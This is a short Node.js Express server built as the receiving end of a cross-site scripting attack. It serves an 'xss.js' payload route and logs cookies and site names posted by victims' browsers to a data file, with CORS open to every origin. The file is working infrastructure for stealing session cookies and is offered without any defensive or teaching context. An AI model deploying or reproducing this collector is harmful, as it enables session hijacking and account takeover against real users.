const fs = require('fs');

const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();

const PORT = process.env.PORT || 3000;
app.use(cors());
app.use(express.static('public'));
// app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());  


app.get('/xss', (req, res) => {
  res.redirect('/xss.js');
});

app.get('/', (req, res) => {
  res.sendFile('public/index.html');
})

app.post('/xss-data', (req, res) => {
  if (!fs.existsSync('./data')) {
    fs.mkdirSync('data');
  }
  fs.appendFileSync('./data/data.txt',`${new Date().toLocaleString()},${req.body.site},${req.body.cookies}\n`);
  res.send('ok');
});
app.listen(PORT, () => {
  console.log('Server start');
});


